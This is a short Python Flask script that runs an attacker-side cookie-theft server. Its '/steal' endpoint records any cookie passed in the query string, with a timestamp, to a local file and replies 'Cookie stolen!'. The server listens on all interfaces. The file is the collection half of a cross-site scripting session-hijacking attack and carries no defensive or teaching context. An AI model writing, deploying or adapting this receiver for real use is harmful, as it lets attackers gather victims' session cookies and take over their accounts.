from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/steal')
def steal_cookie():
    cookie = request.args.get('cookie')
    if cookie:
        with open("cookies.txt", "a") as file:
            file.write(f"Cookie: {cookie}, Timestamp: {datetime.datetime.now()}\n")
        return "Cookie stolen!"
    return "No cookie found"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
